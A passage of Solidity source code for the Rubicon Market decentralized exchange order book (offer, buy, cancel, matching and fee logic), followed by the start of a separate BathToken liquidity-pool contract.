_offer.pay_amt;\n\n        require(uint128(spend) == spend, \"spend is not an int\");\n        require(uint128(quantity) == quantity, \"quantity is not an int\");\n\n        ///@dev For backwards semantic compatibility.\n        if (\n            quantity == 0 ||\n            spend == 0 ||\n            quantity > _offer.pay_amt ||\n            spend > _offer.buy_amt\n        ) {\n            return false;\n        }\n\n        // Fee logic added on taker trades\n        uint256 fee = mul(spend, feeBPS) / 10000;\n        require(\n            _offer.buy_gem.transferFrom(msg.sender, feeTo, fee),\n            \"Insufficient funds to cover fee\"\n        );\n\n        offers[id].pay_amt = sub(_offer.pay_amt, quantity);\n        offers[id].buy_amt = sub(_offer.buy_amt, spend);\n        require(\n            _offer.buy_gem.transferFrom(msg.sender, _offer.owner, spend),\n            \"_offer.buy_gem.transferFrom(msg.sender, _offer.owner, spend) failed - check that you can pay the fee\"\n        );\n        require(\n            _offer.pay_gem.transfer(msg.sender, quantity),\n            \"_offer.pay_gem.transfer(msg.sender, quantity) failed\"\n        );\n\n        emit LogItemUpdate(id);\n        emit LogTake(\n            bytes32(id),\n            keccak256(abi.encodePacked(_offer.pay_gem, _offer.buy_gem)),\n            _offer.owner,\n            _offer.pay_gem,\n            _offer.buy_gem,\n            msg.sender,\n            uint128(quantity),\n            uint128(spend),\n            uint64(block.timestamp)\n        );\n        emit FeeTake(\n            bytes32(id),\n            keccak256(abi.encodePacked(_offer.pay_gem, _offer.buy_gem)),\n            _offer.buy_gem,\n            msg.sender,\n            feeTo,\n            fee,\n            uint64(block.timestamp)\n        );\n        emit LogTrade(\n            quantity,\n            address(_offer.pay_gem),\n            spend,\n            address(_offer.buy_gem)\n        );\n\n        if (offers[id].pay_amt == 0) {\n            delete offers[id];\n            emit OfferDeleted(id);\n        }\n\n        return true;\n    }\n\n    /// @notice Allows the caller to cancel the offer if it is their own.\n    /// @notice This function refunds the offer to the maker.\n    function cancel(uint256 id)\n        public\n        virtual\n        can_cancel(id)\n        synchronized\n        returns (bool success)\n    {\n        OfferInfo memory _offer = offers[id];\n        delete offers[id];\n\n        require(_offer.pay_gem.transfer(_offer.owner, _offer.pay_amt));\n\n        emit LogItemUpdate(id);\n        emit LogKill(\n            bytes32(id),\n            keccak256(abi.encodePacked(_offer.pay_gem, _offer.buy_gem)),\n            _offer.owner,\n            _offer.pay_gem,\n            _offer.buy_gem,\n            uint128(_offer.pay_amt),\n            uint128(_offer.buy_amt),\n            uint64(block.timestamp)\n        );\n\n        success = true;\n    }\n\n    function kill(bytes32 id) external virtual {\n        require(cancel(uint256(id)));\n    }\n\n    function make(\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        uint128 pay_amt,\n        uint128 buy_amt\n    ) external virtual returns (bytes32 id) {\n        return bytes32(offer(pay_amt, pay_gem, buy_amt, buy_gem));\n    }\n\n    /// @notice Key function to make a new offer. Takes funds from the caller into market escrow.\n    function offer(\n        uint256 pay_amt,\n        ERC20 pay_gem,\n        uint256 buy_amt,\n        ERC20 buy_gem\n    ) public virtual can_offer synchronized returns (uint256 id) {\n        require(uint128(pay_amt) == pay_amt);\n        require(uint128(buy_amt) == buy_amt);\n        require(pay_amt > 0);\n        require(pay_gem != ERC20(0x0));\n        require(buy_amt > 0);\n        require(buy_gem != ERC20(0x0));\n        require(pay_gem != buy_gem);\n\n        OfferInfo memory info;\n        info.pay_amt = pay_amt;\n        info.pay_gem = pay_gem;\n        info.buy_amt = buy_amt;\n        info.buy_gem = buy_gem;\n        info.owner = msg.sender;\n        info.timestamp = uint64(block.timestamp);\n        id = _next_id();\n        offers[id] = info;\n\n        require(pay_gem.transferFrom(msg.sender, address(this), pay_amt));\n\n        emit LogItemUpdate(id);\n        emit LogMake(\n            bytes32(id),\n            keccak256(abi.encodePacked(pay_gem, buy_gem)),\n            msg.sender,\n            pay_gem,\n            buy_gem,\n            uint128(pay_amt),\n            uint128(buy_amt),\n            uint64(block.timestamp)\n        );\n    }\n\n    function take(bytes32 id, uint128 maxTakeAmount) external virtual {\n        require(buy(uint256(id), maxTakeAmount));\n    }\n\n    function _next_id() internal returns (uint256) {\n        last_offer_id++;\n        return last_offer_id;\n    }\n\n    // Fee logic\n    function getFeeBPS() internal view returns (uint256) {\n        return feeBPS;\n    }\n}\n\n/// @notice Expiring market is a Simple Market with a market lifetime.\n/// @dev When the close_time has been reached, offers can only be cancelled (offer and buy will throw).\ncontract ExpiringMarket is DSAuth, SimpleMarket {\n    bool public stopped;\n\n    /// @dev After close_time has been reached, no new offers are allowed.\n    modifier can_offer() override {\n        require(!isClosed());\n        _;\n    }\n\n    /// @dev After close, no new buys are allowed.\n    modifier can_buy(uint256 id) override {\n        require(isActive(id));\n        require(!isClosed());\n        _;\n    }\n\n    /// @dev After close, anyone can cancel an offer.\n    modifier can_cancel(uint256 id) virtual override {\n        require(isActive(id));\n        require((msg.sender == getOwner(id)) || isClosed());\n        _;\n    }\n\n    function isClosed() public pure returns (bool closed) {\n        return false;\n    }\n\n    function getTime() public view returns (uint64) {\n        return uint64(block.timestamp);\n    }\n\n    function stop() external auth {\n        stopped = true;\n    }\n}\n\ncontract DSNote {\n    event LogNote(\n        bytes4 indexed sig,\n        address indexed guy,\n        bytes32 indexed foo,\n        bytes32 indexed bar,\n        uint256 wad,\n        bytes fax\n    ) anonymous;\n\n    modifier note() {\n        bytes32 foo;\n        bytes32 bar;\n        uint256 wad;\n\n        assembly {\n            foo := calldataload(4)\n            bar := calldataload(36)\n            wad := callvalue()\n        }\n\n        emit LogNote(msg.sig, msg.sender, foo, bar, wad, msg.data);\n\n        _;\n    }\n}\n\ncontract MatchingEvents {\n    event LogBuyEnabled(bool isEnabled);\n    event LogMinSell(address pay_gem, uint256 min_amount);\n    event LogMatchingEnabled(bool isEnabled);\n    event LogUnsortedOffer(uint256 id);\n    event LogSortedOffer(uint256 id);\n    event LogInsert(address keeper, uint256 id);\n    event LogDelete(address keeper, uint256 id);\n    event LogMatch(uint256 id, uint256 amount);\n}\n\n/// @notice The core Rubicon Market smart contract\n/// @notice This contract is based on the original open-source work done by OasisDEX under the Apache License 2.0\n/// @dev This contract inherits the key trading functionality from SimpleMarket\ncontract RubiconMarket is MatchingEvents, ExpiringMarket, DSNote {\n    bool public buyEnabled = true; //buy enabled\n    bool public matchingEnabled = true; //true: enable matching,\n    //false: revert to expiring market\n    /// @dev Below is variable to allow for a proxy-friendly constructor\n    bool public initialized;\n\n    /// @dev unused deprecated variable for applying a token distribution on top of a trade\n    bool public AqueductDistributionLive;\n    /// @dev unused deprecated variable for applying a token distribution of this token on top of a trade\n    address public AqueductAddress;\n\n    struct sortInfo {\n        uint256 next; //points to id of next higher offer\n        uint256 prev; //points to id of previous lower offer\n        uint256 delb; //the blocknumber where this entry was marked for delete\n    }\n    mapping(uint256 => sortInfo) public _rank; //doubly linked lists of sorted offer ids\n    mapping(address => mapping(address => uint256)) public _best; //id of the highest offer for a token pair\n    mapping(address => mapping(address => uint256)) public _span; //number of offers stored for token pair in sorted orderbook\n    mapping(address => uint256) public _dust; //minimum sell amount for a token to avoid dust offers\n    mapping(uint256 => uint256) public _near; //next unsorted offer id\n    uint256 public _head; //first unsorted offer id\n    uint256 public dustId; // id of the latest offer marked as dust\n\n    /// @dev Proxy-safe initialization of storage\n    function initialize(bool _live, address _feeTo) public {\n        require(!initialized, \"contract is already initialized\");\n        AqueductDistributionLive = _live;\n\n        /// @notice The market fee recipient\n        feeTo = _feeTo;\n\n        owner = msg.sender;\n        emit LogSetOwner(msg.sender);\n\n        /// @notice The starting fee on taker trades in basis points\n        feeBPS = 20;\n\n        initialized = true;\n        matchingEnabled = true;\n        buyEnabled = true;\n    }\n\n    // After close, anyone can cancel an offer\n    modifier can_cancel(uint256 id) override {\n        require(isActive(id), \"Offer was deleted or taken, or never existed.\");\n        require(\n            isClosed() || msg.sender == getOwner(id) || id == dustId,\n            \"Offer can not be cancelled because user is not owner, and market is open, and offer sells required amount of tokens.\"\n        );\n        _;\n    }\n\n    // ---- Public entrypoints ---- //\n\n    function make(\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        uint128 pay_amt,\n        uint128 buy_amt\n    ) public override returns (bytes32) {\n        return bytes32(offer(pay_amt, pay_gem, buy_amt, buy_gem));\n    }\n\n    function take(bytes32 id, uint128 maxTakeAmount) public override {\n        require(buy(uint256(id), maxTakeAmount));\n    }\n\n    function kill(bytes32 id) external override {\n        require(cancel(uint256(id)));\n    }\n\n    // Make a new offer. Takes funds from the caller into market escrow.\n    //\n    // If matching is enabled:\n    //     * creates new offer without putting it in\n    //       the sorted list.\n    //     * available to authorized contracts only!\n    //     * keepers should call insert(id,pos)\n    //       to put offer in the sorted list.\n    //\n    // If matching is disabled:\n    //     * calls expiring market's offer().\n    //     * available to everyone without authorization.\n    //     * no sorting is done.\n    //\n    function offer(\n        uint256 pay_amt, //maker (ask) sell how much\n        ERC20 pay_gem, //maker (ask) sell which token\n        uint256 buy_amt, //taker (ask) buy how much\n        ERC20 buy_gem //taker (ask) buy which token\n    ) public override returns (uint256) {\n        require(!locked, \"Reentrancy attempt\");\n\n\n            function(uint256, ERC20, uint256, ERC20) returns (uint256) fn\n         = matchingEnabled ? _offeru : super.offer;\n        return fn(pay_amt, pay_gem, buy_amt, buy_gem);\n    }\n\n    // Make a new offer. Takes funds from the caller into market escrow.\n    function offer(\n        uint256 pay_amt, //maker (ask) sell how much\n        ERC20 pay_gem, //maker (ask) sell which token\n        uint256 buy_amt, //maker (ask) buy how much\n        ERC20 buy_gem, //maker (ask) buy which token\n        uint256 pos //position to insert offer, 0 should be used if unknown\n    ) external can_offer returns (uint256) {\n        return offer(pay_amt, pay_gem, buy_amt, buy_gem, pos, true);\n    }\n\n    function offer(\n        uint256 pay_amt, //maker (ask) sell how much\n        ERC20 pay_gem, //maker (ask) sell which token\n        uint256 buy_amt, //maker (ask) buy how much\n        ERC20 buy_gem, //maker (ask) buy which token\n        uint256 pos, //position to insert offer, 0 should be used if unknown\n        bool matching //match \"close enough\" orders?\n    ) public can_offer returns (uint256) {\n        require(!locked, \"Reentrancy attempt\");\n        require(_dust[address(pay_gem)] <= pay_amt);\n\n        if (matchingEnabled) {\n            return _matcho(pay_amt, pay_gem, buy_amt, buy_gem, pos, matching);\n        }\n        return super.offer(pay_amt, pay_gem, buy_amt, buy_gem);\n    }\n\n    //Transfers funds from caller to offer maker, and from market to caller.\n    function buy(uint256 id, uint256 amount)\n        public\n        override\n        can_buy(id)\n        returns (bool)\n    {\n        require(!locked, \"Reentrancy attempt\");\n\n        //Optional distribution on trade\n        if (AqueductDistributionLive) {\n            IAqueduct(AqueductAddress).distributeToMakerAndTaker(\n                getOwner(id),\n                msg.sender\n            );\n        }\n        function(uint256, uint256) returns (bool) fn = matchingEnabled\n            ? _buys\n            : super.buy;\n\n        return fn(id, amount);\n    }\n\n    // Cancel an offer. Refunds offer maker.\n    function cancel(uint256 id)\n        public\n        override\n        can_cancel(id)\n        returns (bool success)\n    {\n        require(!locked, \"Reentrancy attempt\");\n        if (matchingEnabled) {\n            if (isOfferSorted(id)) {\n                require(_unsort(id));\n            } else {\n                require(_hide(id));\n            }\n        }\n        return super.cancel(id); //delete the offer.\n    }\n\n    //insert offer into the sorted list\n    //keepers need to use this function\n    function insert(\n        uint256 id, //maker (ask) id\n        uint256 pos //position to insert into\n    ) public returns (bool) {\n        require(!locked, \"Reentrancy attempt\");\n        require(!isOfferSorted(id)); //make sure offers[id] is not yet sorted\n        require(isActive(id)); //make sure offers[id] is active\n\n        _hide(id); //remove offer from unsorted offers list\n        _sort(id, pos); //put offer into the sorted offers list\n        emit LogInsert(msg.sender, id);\n        return true;\n    }\n\n    //deletes _rank [id]\n    //  Function should be called by keepers.\n    function del_rank(uint256 id) external returns (bool) {\n        require(!locked, \"Reentrancy attempt\");\n        require(\n            !isActive(id) &&\n                _rank[id].delb != 0 &&\n                _rank[id].delb < block.number - 10\n        );\n        delete _rank[id];\n        emit LogDelete(msg.sender, id);\n        return true;\n    }\n\n    //set the minimum sell amount for a token\n    //    Function is used to avoid \"dust offers\" that have\n    //    very small amount of tokens to sell, and it would\n    //    cost more gas to accept the offer, than the value\n    //    of tokens received.\n    function setMinSell(\n        ERC20 pay_gem, //token to assign minimum sell amount to\n        uint256 dust //maker (ask) minimum sell amount\n    ) external auth note returns (bool) {\n        _dust[address(pay_gem)] = dust;\n        emit LogMinSell(address(pay_gem), dust);\n        return true;\n    }\n\n    //returns the minimum sell amount for an offer\n    function getMinSell(\n        ERC20 pay_gem //token for which minimum sell amount is queried\n    ) external view returns (uint256) {\n        return _dust[address(pay_gem)];\n    }\n\n    //set buy functionality enabled/disabled\n    function setBuyEnabled(bool buyEnabled_) external auth returns (bool) {\n        buyEnabled = buyEnabled_;\n        emit LogBuyEnabled(buyEnabled);\n        return true;\n    }\n\n    //set matching enabled/disabled\n    //    If matchingEnabled true(default), then inserted offers are matched.\n    //    Except the ones inserted by contracts, because those end up\n    //    in the unsorted list of offers, that must be later sorted by\n    //    keepers using insert().\n    //    If matchingEnabled is false then RubiconMarket is reverted to ExpiringMarket,\n    //    and matching is not done, and sorted lists are disabled.\n    function setMatchingEnabled(bool matchingEnabled_)\n        external\n        auth\n        returns (bool)\n    {\n        matchingEnabled = matchingEnabled_;\n        emit LogMatchingEnabled(matchingEnabled);\n        return true;\n    }\n\n    //return the best offer for a token pair\n    //      the best offer is the lowest one if it's an ask,\n    //      and highest one if it's a bid offer\n    function getBestOffer(ERC20 sell_gem, ERC20 buy_gem)\n        public\n        view\n        returns (uint256)\n    {\n        return _best[address(sell_gem)][address(buy_gem)];\n    }\n\n    //return the next worse offer in the sorted list\n    //      the worse offer is the higher one if its an ask,\n    //      a lower one if its a bid offer,\n    //      and in both cases the newer one if they're equal.\n    function getWorseOffer(uint256 id) public view returns (uint256) {\n        return _rank[id].prev;\n    }\n\n    //return the next better offer in the sorted list\n    //      the better offer is in the lower priced one if its an ask,\n    //      the next higher priced one if its a bid offer\n    //      and in both cases the older one if they're equal.\n    function getBetterOffer(uint256 id) external view returns (uint256) {\n        return _rank[id].next;\n    }\n\n    //return the amount of better offers for a token pair\n    function getOfferCount(ERC20 sell_gem, ERC20 buy_gem)\n        public\n        view\n        returns (uint256)\n    {\n        return _span[address(sell_gem)][address(buy_gem)];\n    }\n\n    //get the first unsorted offer that was inserted by a contract\n    //      Contracts can't calculate the insertion position of their offer because it is not an O(1) operation.\n    //      Their offers get put in the unsorted list of offers.\n    //      Keepers can calculate the insertion position offchain and pass it to the insert() function to insert\n    //      the unsorted offer into the sorted list. Unsorted offers will not be matched, but can be bought with buy().\n    function getFirstUnsortedOffer() public view returns (uint256) {\n        return _head;\n    }\n\n    //get the next unsorted offer\n    //      Can be used to cycle through all the unsorted offers.\n    function getNextUnsortedOffer(uint256 id) public view returns (uint256) {\n        return _near[id];\n    }\n\n    function isOfferSorted(uint256 id) public view returns (bool) {\n        return\n            _rank[id].next != 0 ||\n            _rank[id].prev != 0 ||\n            _best[address(offers[id].pay_gem)][address(offers[id].buy_gem)] ==\n            id;\n    }\n\n    function sellAllAmount(\n        ERC20 pay_gem,\n        uint256 pay_amt,\n        ERC20 buy_gem,\n        uint256 min_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked, \"Reentrancy attempt\");\n        uint256 offerId;\n        while (pay_amt > 0) {\n            //while there is amount to sell\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0); //Fails if there are not more offers\n\n            // There is a chance that pay_amt is smaller than 1 wei of the other token\n            if (\n                pay_amt * 1 ether <\n                wdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (pay_amt >= offers[offerId].buy_amt) {\n                //If amount to sell is higher or equal than current offer amount to buy\n                fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount bought to acumulator\n                pay_amt = sub(pay_amt, offers[offerId].buy_amt); //Decrease amount to sell\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                // if lower\n                uint256 baux = rmul(\n                    pay_amt * 10**9,\n                    rdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n                ) / 10**9;\n                fill_amt = add(fill_amt, baux); //Add amount bought to acumulator\n                take(bytes32(offerId), uint128(baux)); //We take the portion of the offer that we need\n                pay_amt = 0; //All amount is sold\n            }\n        }\n        require(fill_amt >= min_fill_amount);\n    }\n\n    function buyAllAmount(\n        ERC20 buy_gem,\n        uint256 buy_amt,\n        ERC20 pay_gem,\n        uint256 max_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked, \"Reentrancy attempt\");\n        uint256 offerId;\n        while (buy_amt > 0) {\n            //Meanwhile there is amount to buy\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0);\n\n            // There is a chance that buy_amt is smaller than 1 wei of the other token\n            if (\n                buy_amt * 1 ether <\n                wdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (buy_amt >= offers[offerId].pay_amt) {\n                //If amount to buy is higher or equal than current offer amount to sell\n                fill_amt = add(fill_amt, offers[offerId].buy_amt); //Add amount sold to acumulator\n                buy_amt = sub(buy_amt, offers[offerId].pay_amt); //Decrease amount to buy\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                //if lower\n                fill_amt = add(\n                    fill_amt,\n                    rmul(\n                        buy_amt * 10**9,\n                        rdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n                    ) / 10**9\n                ); //Add amount sold to acumulator\n                take(bytes32(offerId), uint128(buy_amt)); //We take the portion of the offer that we need\n                buy_amt = 0; //All amount is bought\n            }\n        }\n        require(fill_amt <= max_fill_amount);\n    }\n\n    function getBuyAmount(\n        ERC20 buy_gem,\n        ERC20 pay_gem,\n        uint256 pay_amt\n    ) external view returns (uint256 fill_amt) {\n        uint256 offerId = getBestOffer(buy_gem, pay_gem); //Get best offer for the token pair\n        while (pay_amt > offers[offerId].buy_amt) {\n            fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount to buy accumulator\n            pay_amt = sub(pay_amt, offers[offerId].buy_amt); //Decrease amount to pay\n            if (pay_amt > 0) {\n                //If we still need more offers\n                offerId = getWorseOffer(offerId); //We look for the next best offer\n                require(offerId != 0); //Fails if there are not enough offers to complete\n            }\n        }\n        fill_amt = add(\n            fill_amt,\n            rmul(\n                pay_amt * 10**9,\n                rdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n            ) / 10**9\n        ); //Add proportional amount of last offer to buy accumulator\n    }\n\n    function getPayAmount(\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        uint256 buy_amt\n    ) external view returns (uint256 fill_amt) {\n        uint256 offerId = getBestOffer(buy_gem, pay_gem); //Get best offer for the token pair\n        while (buy_amt > offers[offerId].pay_amt) {\n            fill_amt = add(fill_amt, offers[offerId].buy_amt); //Add amount to pay accumulator\n            buy_amt = sub(buy_amt, offers[offerId].pay_amt); //Decrease amount to buy\n            if (buy_amt > 0) {\n                //If we still need more offers\n                offerId = getWorseOffer(offerId); //We look for the next best offer\n                require(offerId != 0); //Fails if there are not enough offers to complete\n            }\n        }\n        fill_amt = add(\n            fill_amt,\n            rmul(\n                buy_amt * 10**9,\n                rdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n            ) / 10**9\n        ); //Add proportional amount of last offer to pay accumulator\n    }\n\n    // ---- Internal Functions ---- //\n\n    function _buys(uint256 id, uint256 amount) internal returns (bool) {\n        require(buyEnabled);\n        if (amount == offers[id].pay_amt) {\n            if (isOfferSorted(id)) {\n                //offers[id] must be removed from sorted list because all of it is bought\n                _unsort(id);\n            } else {\n                _hide(id);\n            }\n        }\n\n        require(super.buy(id, amount));\n\n        // If offer has become dust during buy, we cancel it\n        if (\n            isActive(id) &&\n            offers[id].pay_amt < _dust[address(offers[id].pay_gem)]\n        ) {\n            dustId = id; //enable current msg.sender to call cancel(id)\n            cancel(id);\n        }\n        return true;\n    }\n\n    //find the id of the next higher offer after offers[id]\n    function _find(uint256 id) internal view returns (uint256) {\n        require(id > 0);\n\n        address buy_gem = address(offers[id].buy_gem);\n        address pay_gem = address(offers[id].pay_gem);\n        uint256 top = _best[pay_gem][buy_gem];\n        uint256 old_top = 0;\n\n        // Find the larger-than-id order whose successor is less-than-id.\n        while (top != 0 && _isPricedLtOrEq(id, top)) {\n            old_top = top;\n            top = _rank[top].prev;\n        }\n        return old_top;\n    }\n\n    //find the id of the next higher offer after offers[id]\n    function _findpos(uint256 id, uint256 pos) internal view returns (uint256) {\n        require(id > 0);\n\n        // Look for an active order.\n        while (pos != 0 && !isActive(pos)) {\n            pos = _rank[pos].prev;\n        }\n\n        if (pos == 0) {\n            //if we got to the end of list without a single active offer\n            return _find(id);\n        } else {\n            // if we did find a nearby active offer\n            // Walk the order book down from there...\n            if (_isPricedLtOrEq(id, pos)) {\n                uint256 old_pos;\n\n                // Guaranteed to run at least once because of\n                // the prior if statements.\n                while (pos != 0 && _isPricedLtOrEq(id, pos)) {\n                    old_pos = pos;\n                    pos = _rank[pos].prev;\n                }\n                return old_pos;\n\n                // ...or walk it up.\n            } else {\n                while (pos != 0 && !_isPricedLtOrEq(id, pos)) {\n                    pos = _rank[pos].next;\n                }\n                return pos;\n            }\n        }\n    }\n\n    //return true if offers[low] priced less than or equal to offers[high]\n    function _isPricedLtOrEq(\n        uint256 low, //lower priced offer's id\n        uint256 high //higher priced offer's id\n    ) internal view returns (bool) {\n        return\n            mul(offers[low].buy_amt, offers[high].pay_amt) >=\n            mul(offers[high].buy_amt, offers[low].pay_amt);\n    }\n\n    //these variables are global only because of solidity local variable limit\n\n    //match offers with taker offer, and execute token transactions\n    function _matcho(\n        uint256 t_pay_amt, //taker sell how much\n        ERC20 t_pay_gem, //taker sell which token\n        uint256 t_buy_amt, //taker buy how much\n        ERC20 t_buy_gem, //taker buy which token\n        uint256 pos, //position id\n        bool rounding //match \"close enough\" orders?\n    ) internal returns (uint256 id) {\n        uint256 best_maker_id; //highest maker id\n        uint256 t_buy_amt_old; //taker buy how much saved\n        uint256 m_buy_amt; //maker offer wants to buy this much token\n        uint256 m_pay_amt; //maker offer wants to sell this much token\n\n        // there is at least one offer stored for token pair\n        while (_best[address(t_buy_gem)][address(t_pay_gem)] > 0) {\n            best_maker_id = _best[address(t_buy_gem)][address(t_pay_gem)];\n            m_buy_amt = offers[best_maker_id].buy_amt;\n            m_pay_amt = offers[best_maker_id].pay_amt;\n\n            // Ugly hack to work around rounding errors. Based on the idea that\n            // the furthest the amounts can stray from their \"true\" values is 1.\n            // Ergo the worst case has t_pay_amt and m_pay_amt at +1 away from\n            // their \"correct\" values and m_buy_amt and t_buy_amt at -1.\n            // Since (c - 1) * (d - 1) > (a + 1) * (b + 1) is equivalent to\n            // c * d > a * b + a + b + c + d, we write...\n            if (\n                mul(m_buy_amt, t_buy_amt) >\n                mul(t_pay_amt, m_pay_amt) +\n                    (\n                        rounding\n                            ? m_buy_amt + t_buy_amt + t_pay_amt + m_pay_amt\n                            : 0\n                    )\n            ) {\n                break;\n            }\n            // ^ The `rounding` parameter is a compromise borne of a couple days\n            // of discussion.\n            buy(best_maker_id, min(m_pay_amt, t_buy_amt));\n            emit LogMatch(id, min(m_pay_amt, t_buy_amt));\n            t_buy_amt_old = t_buy_amt;\n            t_buy_amt = sub(t_buy_amt, min(m_pay_amt, t_buy_amt));\n            t_pay_amt = mul(t_buy_amt, t_pay_amt) / t_buy_amt_old;\n\n            if (t_pay_amt == 0 || t_buy_amt == 0) {\n                break;\n            }\n        }\n\n        if (\n            t_buy_amt > 0 &&\n            t_pay_amt > 0 &&\n            t_pay_amt >= _dust[address(t_pay_gem)]\n        ) {\n            //new offer should be created\n            id = super.offer(t_pay_amt, t_pay_gem, t_buy_amt, t_buy_gem);\n            //insert offer into the sorted list\n            _sort(id, pos);\n        }\n    }\n\n    // Make a new offer without putting it in the sorted list.\n    // Takes funds from the caller into market escrow.\n    // Keepers should call insert(id,pos) to put offer in the sorted list.\n    function _offeru(\n        uint256 pay_amt, //maker (ask) sell how much\n        ERC20 pay_gem, //maker (ask) sell which token\n        uint256 buy_amt, //maker (ask) buy how much\n        ERC20 buy_gem //maker (ask) buy which token\n    ) internal returns (uint256 id) {\n        require(_dust[address(pay_gem)] <= pay_amt);\n        id = super.offer(pay_amt, pay_gem, buy_amt, buy_gem);\n        _near[id] = _head;\n        _head = id;\n        emit LogUnsortedOffer(id);\n    }\n\n    //put offer into the sorted list\n    function _sort(\n        uint256 id, //maker (ask) id\n        uint256 pos //position to insert into\n    ) internal {\n        require(isActive(id));\n\n        ERC20 buy_gem = offers[id].buy_gem;\n        ERC20 pay_gem = offers[id].pay_gem;\n        uint256 prev_id; //maker (ask) id\n\n        pos = pos == 0 ||\n            offers[pos].pay_gem != pay_gem ||\n            offers[pos].buy_gem != buy_gem ||\n            !isOfferSorted(pos)\n            ? _find(id)\n            : _findpos(id, pos);\n\n        if (pos != 0) {\n            //offers[id] is not the highest offer\n            //requirement below is satisfied by statements above\n            //require(_isPricedLtOrEq(id, pos));\n            prev_id = _rank[pos].prev;\n            _rank[pos].prev = id;\n            _rank[id].next = pos;\n        } else {\n            //offers[id] is the highest offer\n            prev_id = _best[address(pay_gem)][address(buy_gem)];\n            _best[address(pay_gem)][address(buy_gem)] = id;\n        }\n\n        if (prev_id != 0) {\n            //if lower offer does exist\n            //requirement below is satisfied by statements above\n            //require(!_isPricedLtOrEq(id, prev_id));\n            _rank[prev_id].next = id;\n            _rank[id].prev = prev_id;\n        }\n\n        _span[address(pay_gem)][address(buy_gem)]++;\n        emit LogSortedOffer(id);\n    }\n\n    // Remove offer from the sorted list (does not cancel offer)\n    function _unsort(\n        uint256 id //id of maker (ask) offer to remove from sorted list\n    ) internal returns (bool) {\n        address buy_gem = address(offers[id].buy_gem);\n        address pay_gem = address(offers[id].pay_gem);\n        require(_span[pay_gem][buy_gem] > 0);\n\n        require(\n            _rank[id].delb == 0 && //assert id is in the sorted list\n                isOfferSorted(id)\n        );\n\n        if (id != _best[pay_gem][buy_gem]) {\n            // offers[id] is not the highest offer\n            require(_rank[_rank[id].next].prev == id);\n            _rank[_rank[id].next].prev = _rank[id].prev;\n        } else {\n            //offers[id] is the highest offer\n            _best[pay_gem][buy_gem] = _rank[id].prev;\n        }\n\n        if (_rank[id].prev != 0) {\n            //offers[id] is not the lowest offer\n            require(_rank[_rank[id].prev].next == id);\n            _rank[_rank[id].prev].next = _rank[id].next;\n        }\n\n        _span[pay_gem][buy_gem]--;\n        _rank[id].delb = block.number; //mark _rank[id] for deletion\n        return true;\n    }\n\n    //Hide offer from the unsorted order book (does not cancel offer)\n    function _hide(\n        uint256 id //id of maker offer to remove from unsorted list\n    ) internal returns (bool) {\n        uint256 uid = _head; //id of an offer in unsorted offers list\n        uint256 pre = uid; //id of previous offer in unsorted offers list\n\n        require(!isOfferSorted(id)); //make sure offer id is not in sorted offers list\n\n        if (_head == id) {\n            //check if offer is first offer in unsorted offers list\n            _head = _near[id]; //set head to new first unsorted offer\n            _near[id] = 0; //delete order from unsorted order list\n            return true;\n        }\n        while (uid > 0 && uid != id) {\n            //find offer in unsorted order list\n            pre = uid;\n            uid = _near[uid];\n        }\n        if (uid != id) {\n            //did not find offer id in unsorted offers list\n            return false;\n        }\n        _near[pre] = _near[id]; //set previous unsorted offer to point to offer after offer id\n        _near[id] = 0; //delete order from unsorted order list\n        return true;\n    }\n\n    function setFeeBPS(uint256 _newFeeBPS) external auth returns (bool) {\n        feeBPS = _newFeeBPS;\n        return true;\n    }\n\n    /// @dev unused deprecated function for applying a token distribution on top of a trade\n    function setAqueductDistributionLive(bool live)\n        external\n        auth\n        returns (bool)\n    {\n        AqueductDistributionLive = live;\n        return true;\n    }\n\n    /// @dev unused deprecated variable for applying a token distribution on top of a trade\n    function setAqueductAddress(address _Aqueduct)\n        external\n        auth\n        returns (bool)\n    {\n        AqueductAddress = _Aqueduct;\n        return true;\n    }\n\n    function setFeeTo(address newFeeTo) external auth returns (bool) {\n        feeTo = newFeeTo;\n        return true;\n    }\n}\n\ninterface IWETH {\n    function deposit() external payable;\n\n    function transfer(address to, uint256 value) external returns (bool);\n\n    function withdraw(uint256) external;\n\n    function approve(address guy, uint256 wad) external returns (bool);\n}\n\ninterface IAqueduct {\n    function distributeToMakerAndTaker(address maker, address taker)\n        external\n        returns (bool);\n}\n\n\n// SPDX-License-Identifier: BUSL-1.1\n\n/// @author Rubicon DeFi Inc. - bghughes.eth\n/// @notice This contract represents a single-asset liquidity pool for Rubicon Pools\n/// @notice Any user can deposit assets into this pool and earn yield from successful strategist market making with their liquidity\n/// @notice This contract looks to both BathPairs and the BathHouse as its admin\n\npragma solidity =0.7.6;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\nimport \"../interfaces/IBathHouse.sol\";\nimport \"../interfaces/IRubiconMarket.sol\";\nimport \"../interfaces/IBathBuddy.sol\";\n\ncontract BathToken {\n    using SafeMath for uint256;\n\n    /// *** Storage Variables ***\n\n    /// @notice The initialization status of the Bath Token\n    bool public initialized;\n\n    /// @notice  ** ERC-20 **\n    string public symbol;\n    string public name;\n    uint8 public decimals;\n\n    /// @notice The RubiconMarket.sol instance that all pool liquidity is intially directed to as market-making offers\n    address public RubiconMarketAddress;\n\n    /// @notice The Bath House admin of the Bath Token\n    address public bathHouse;\n\n    /// @notice The withdrawal fee recipient, typically the Bath Token itself\n    address public feeTo;\n\n    /// @notice The underlying ERC-20 token which is the core 